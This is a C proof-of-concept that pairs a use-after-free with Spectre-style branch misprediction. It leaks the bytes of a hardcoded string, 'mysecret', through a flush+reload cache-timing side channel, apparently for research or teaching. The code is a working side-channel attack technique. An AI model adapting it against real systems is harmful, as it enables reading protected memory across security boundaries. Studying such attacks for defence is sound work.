#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define N_PAGES 256
#define REPETITIONS 10
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 175
#define SECRET_SIZE 8
#define N_TRAINING 10
#define SECRET "mysecret"
#define false 0
#define true  1
#define DBG 0
#define MALLOC_SIZE 4096        //this helps malloc at same location. (cp size)

cp_t* flush_reload_arr;

extern inline void attack_func(int secret_index) {

    int* i_dupe = malloc(MALLOC_SIZE);
    *i_dupe = secret_index;
    printf("i dupe addr: %p\n", i_dupe);
}

/*
 * Variables required in cache:
 * i
 * SECRET
 *
 * Variables requried in mem:
 *  freed[0]
 */
//training: free_index=2 print_index=0
//attack:   free_index=0 print_index={iterate through string SECRET}
void victim_func(int free_index, int secret_index) {

    //alloc 3 numbers. put addresses in array to prevent branches (fools branch predictor).
    int  k_idx = 0;
    int  l_idx = 1;
    int  m_idx = 2;
    int  n_alloced_numbers = 3;
    int* k = calloc(1, MALLOC_SIZE);
    int* l = calloc(1, MALLOC_SIZE);
    int* m = calloc(1, MALLOC_SIZE);
    int* klm_addresses[n_alloced_numbers];
    klm_addresses[k_idx] = k;
    klm_addresses[l_idx] = l;
    klm_addresses[m_idx] = m;

    //array that tracks which numbers are freed. Default value is false.
    char freed[n_alloced_numbers] __attribute__ ((aligned (256)));
    for(int i = 0; i < n_alloced_numbers; i++) freed[i] = false;

    //free either k,l or m, depending on the parameter. Branch predictor cannot determine which (no branches).
    int* klm_address = klm_addresses[free_index];
    free(klm_address);
    freed[free_index] = true;

    //Now that k,l or m has been freed. A new allocation of the same size most likely
    //gets the address that was just freed. In the attack scenario, this is k.
    //The attacker who controls k can now overwrite k as wel please.
    int* k_dupe = malloc(MALLOC_SIZE);
    *k_dupe = secret_index;

    //increase branch history for better accuracy
    for(int i = 0; i < 100; i++) {if(i%2==0) {volatile int x = 0;} else {volatile int x = 1;}}

    //Remove freed[k_idx] from cache, so that the branch will speculatively execute.
    cpuid();
    flush((void*)&freed[k_idx]);
    cpuid();

    if(!freed[0]) {
        //Byte k (equals secret_index) is leaked into the flush+reload array.
        volatile cp_t cp = flush_reload_arr[SECRET[*k]];
    }

    cpuid();

    //Optional debug print and freeing of allocated memory.
    //if(DBG && free_index==0) printf("k: %p (%d)\toverwrite_addr:%p (%d)\tnew val k: %d\n", k, *k, k_dupe, *k_dupe, *k);
    if(!freed[0]) free(k);
    if(!freed[1]) free(l);
    if(!freed[2]) free(m);
    free(k_dupe);
}

int* prepare(int secret_index) {

    flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr((void*)flush_reload_arr, N_PAGES);

    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses = N_TRAINING -(rand() % (N_TRAINING/2)) + 1;
    char free_indices[n_accesses];
    char secret_indices[n_accesses];
    for(int i = 0; i < n_accesses; i++) {
        free_indices[i] = 2;
        secret_indices[i] = 0;
    }
    free_indices[n_accesses-1] = 0;
    secret_indices[n_accesses-1] = secret_index;
    cpuid();

    for(int i = 0; i < n_accesses; i++) {
        //if(DBG) printf("%d:\tfree %d\tsecret %d\n", i, free_indices[i], secret_indices[i]);
        victim_func(free_indices[i], secret_indices[i]);
        cpuid();
        if(free_indices[i] != 0) {
            cpuid();
            flush_arr(flush_reload_arr, N_PAGES);
        }
        cpuid();
    }

    cpuid();

    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(flush_reload_arr, N_PAGES);
    return results;
}

int main(int argc, char** argv) {
    srand(time(0));
    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    //results[0][0] = prepare(1);
    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(s);
            cpuid();
        }
    }

    print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, SECRET_SIZE);

}